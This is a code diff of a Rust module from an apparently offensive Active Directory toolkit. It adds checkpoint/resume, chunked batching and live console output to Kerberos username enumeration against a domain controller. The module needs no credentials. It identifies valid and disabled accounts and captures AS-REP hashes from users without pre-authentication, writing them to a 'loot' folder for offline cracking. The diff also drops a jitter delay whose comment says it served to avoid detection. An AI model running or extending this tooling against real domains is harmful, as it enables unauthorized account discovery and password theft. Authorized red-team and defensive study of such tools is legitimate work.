@@ -10,6 +10,7 @@
 
 use colored::Colorize;
 use indicatif::{ProgressBar, ProgressStyle};
+use overthrone_core::checkpoint::Checkpoint;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::kerberos::{self, UserEnumStatus};
 use serde::{Deserialize, Serialize};
@@ -155,6 +156,12 @@ pub struct UserEnumConfig {
     pub concurrency: usize,
     /// Use LDAP for additional user attributes (enriches enumeration)
     pub use_ldap: bool,
+    /// Path to checkpoint file for resume (empty = no checkpoint)
+    pub checkpoint_path: Option<PathBuf>,
+    /// Resume from checkpoint if available
+    pub resume: bool,
+    /// Show live output as users are found
+    pub live_output: bool,
 }
 
 impl Default for UserEnumConfig {
@@ -165,6 +172,9 @@ impl Default for UserEnumConfig {
             save_asrep_hashes: true,
             concurrency: 10,
             use_ldap: false,
+            checkpoint_path: None,
+            resume: false,
+            live_output: true,
         }
     }
 }
@@ -242,11 +252,15 @@ pub struct AsRepCapture {
 
 /// Run Kerberos username enumeration against the target DC.
 /// No credentials required — uses only AS-REQ error code analysis.
+///
+/// Supports checkpoint/resume: when `uc.resume` is true, loads existing checkpoint
+/// and skips already-processed users. Processes in chunks for periodic checkpointing.
+/// Live output prints valid/disabled/preauth users immediately as discovered.
 pub async fn run(
     dc_ip: &str,
     domain: &str,
     uc: &UserEnumConfig,
-    jitter_ms: u64,
+    _jitter_ms: u64,
 ) -> Result<UserEnumResult> {
     info!("{}", "═══ KERBEROS USER ENUMERATION ═══".bold().magenta());
 
@@ -271,6 +285,34 @@ pub async fn run(
         source
     );
 
+    // ── Checkpoint setup ──────────────────────────────────────────
+    let ckpt_path = uc.checkpoint_path.clone().unwrap_or_else(|| {
+        overthrone_core::checkpoint::checkpoint_path(None, "user-enum", domain, dc_ip)
+    });
+    let resume = uc.resume && ckpt_path.exists();
+    if resume {
+        info!("Resuming from checkpoint: {}", ckpt_path.display());
+    }
+    let mut ckpt = Checkpoint::load_or_new(&ckpt_path, "user-enum", dc_ip, domain, usernames.len());
+
+    // Determine which users still need processing
+    let to_process: Vec<&str> = if resume {
+        let pending = ckpt.pending(&usernames);
+        if pending.is_empty() {
+            info!("All users already processed in prior session — reusing results.");
+        } else {
+            info!(
+                "{} users remain, skipping {} already processed",
+                pending.len(),
+                usernames.len() - pending.len()
+            );
+        }
+        pending
+    } else {
+        usernames.iter().map(|s| s.as_str()).collect()
+    };
+
+    // ── Progress bar ───────────────────────────────────────────────
     let pb = ProgressBar::new(usernames.len() as u64);
     pb.set_style(
         ProgressStyle::default_bar()
@@ -281,67 +323,103 @@ pub async fn run(
             })
             .progress_chars("█▓░"),
     );
+    pb.set_position(ckpt.processed_count() as u64);
 
-    let mut valid_users = Vec::new();
-    let mut no_preauth_users = Vec::new();
-    let mut disabled_users = Vec::new();
+    // ── Process in chunks ──────────────────────────────────────────
+    const CHUNK_SIZE: usize = 50;
+    let mut valid_users: Vec<String> = Vec::new();
+    let mut no_preauth_users: Vec<AsRepCapture> = Vec::new();
+    let mut disabled_users: Vec<String> = Vec::new();
     let mut not_found: usize = 0;
-    let mut errors = Vec::new();
+    let mut errors: Vec<(String, String)> = Vec::new();
 
-    for username in &usernames {
-        pb.set_message((*username).to_string());
-
-        let status = kerberos::user_enum_single(dc_ip, domain, username).await;
-
-        match status {
-            UserEnumStatus::Valid => {
-                info!(" {} {} — {}", "✓".green(), username.bold(), "VALID".green());
-                valid_users.push((*username).to_string());
-            }
-            UserEnumStatus::ValidNoPreauth(hash) => {
-                info!(
-                    " {} {} — {} (AS-REP hash captured!)",
-                    "★".bright_yellow(),
-                    username.bold(),
-                    "VALID + NO PREAUTH".bright_yellow()
-                );
-                valid_users.push((*username).to_string());
+    // Restore previously found results from checkpoint
+    for entry in ckpt.results() {
+        match entry.status.as_str() {
+            "valid" => valid_users.push(entry.item.clone()),
+            "no_preauth" => {
+                valid_users.push(entry.item.clone());
                 no_preauth_users.push(AsRepCapture {
-                    username: (*username).to_string(),
-                    hash_string: hash.hash_string,
+                    username: entry.item.clone(),
+                    hash_string: entry.detail.clone().unwrap_or_default(),
                 });
             }
-            UserEnumStatus::Disabled => {
-                info!(
-                    " {} {} — {}",
-                    "⚠".yellow(),
-                    username.bold(),
-                    "DISABLED".yellow()
-                );
-                disabled_users.push((*username).to_string());
+            "disabled" => disabled_users.push(entry.item.clone()),
+            "not_found" => not_found += 1,
+            _ => {}
+        }
+    }
+
+    for chunk in to_process.chunks(CHUNK_SIZE) {
+        let chunk_owned: Vec<String> = chunk.iter().map(|s| (*s).to_string()).collect();
+        let results = kerberos::user_enum_batch(dc_ip, domain, &chunk_owned).await;
+
+        for (username, status) in &results {
+            pb.set_message(username.clone());
+
+            match status {
+                UserEnumStatus::Valid => {
+                    valid_users.push(username.clone());
+                    ckpt.record(username, "valid", None);
+                    if uc.live_output {
+                        println!(
+                            "  {} {} — {}",
+                            "✓".green(),
+                            username.bold().green(),
+                            "VALID".green()
+                        );
+                    }
+                }
+                UserEnumStatus::ValidNoPreauth(hash) => {
+                    valid_users.push(username.clone());
+                    let hash_str = hash.hash_string.clone();
+                    no_preauth_users.push(AsRepCapture {
+                        username: username.clone(),
+                        hash_string: hash_str.clone(),
+                    });
+                    ckpt.record(username, "no_preauth", Some(hash_str.clone()));
+                    if uc.live_output {
+                        println!(
+                            "  {} {} — {} (hash captured)",
+                            "★".bright_yellow(),
+                            username.bold().bright_yellow(),
+                            "VALID + NO PREAUTH".bright_yellow()
+                        );
+                    }
+                }
+                UserEnumStatus::Disabled => {
+                    disabled_users.push(username.clone());
+                    ckpt.record(username, "disabled", None);
+                    if uc.live_output {
+                        println!(
+                            "  {} {} — {}",
+                            "⚠".yellow(),
+                            username.bold().yellow(),
+                            "DISABLED".yellow()
+                        );
+                    }
+                }
+                UserEnumStatus::NotFound => {
+                    ckpt.record(username, "not_found", None);
+                    not_found += 1;
+                }
+                UserEnumStatus::Error(e) => {
+                    ckpt.record(username, "error", Some(e.clone()));
+                    errors.push((username.clone(), e.clone()));
+                }
             }
-            UserEnumStatus::NotFound => {
-                debug!(" {} {} — not found", "✗".dimmed(), username);
-                not_found += 1;
-            }
-            UserEnumStatus::Error(e) => {
-                debug!(" {} {} — {}", "✗".red(), username, e);
-                errors.push(((*username).to_string(), e));
-            }
+
+            pb.inc(1);
         }
 
-        // Apply jitter between requests to avoid detection
-        if jitter_ms > 0 {
-            let jitter = rand::random::<u64>() % jitter_ms;
-            tokio::time::sleep(tokio::time::Duration::from_millis(jitter)).await;
-        }
-
-        pb.inc(1);
+        // Save checkpoint after each chunk
+        ckpt.save();
     }
 
     pb.finish_with_message("done");
+    ckpt.save();
 
-    // Save valid users to output file
+    // ── Save results ───────────────────────────────────────────────
     let loot_dir = PathBuf::from("./loot");
     let _ = tokio::fs::create_dir_all(&loot_dir).await;
 
@@ -361,7 +439,6 @@ pub async fn run(
         );
     }
 
-    // Save AS-REP hashes if any
     if uc.save_asrep_hashes && !no_preauth_users.is_empty() {
         let hash_path = loot_dir.join("userenum_asrep_hashes.txt");
         let hash_lines: String = no_preauth_users
@@ -377,7 +454,12 @@ pub async fn run(
         );
     }
 
-    // Summary
+    // Clean up checkpoint on successful completion
+    if std::fs::remove_file(&ckpt_path).is_ok() {
+        debug!("Checkpoint file removed after successful completion");
+    }
+
+    // ── Summary ────────────────────────────────────────────────────
     println!("\n{}", "═══ USER ENUMERATION RESULTS ═══".bold().cyan());
     println!(
         "  {} Valid users:       {}",
